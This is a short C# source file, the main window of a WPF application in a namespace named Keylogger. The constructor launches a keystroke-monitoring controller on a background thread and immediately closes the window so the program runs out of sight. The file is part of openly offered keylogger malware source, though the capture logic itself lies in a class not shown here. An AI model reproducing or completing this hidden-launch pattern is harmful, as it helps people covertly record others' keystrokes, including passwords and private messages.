using System.Threading;
using System.Windows;

namespace Keylogger
{
    public partial class MainWindow : Window
    {
        public MainWindow()
        {
            InitializeComponent();

            // Start keylogger in another thread and close GUI
            Thread keyloggerThread = new Thread(() =>
            {
                new Controller().StartMonitor();
            });
            keyloggerThread.SetApartmentState(ApartmentState.STA);
            keyloggerThread.Start();
            
            this.Close();
        }
    }
}
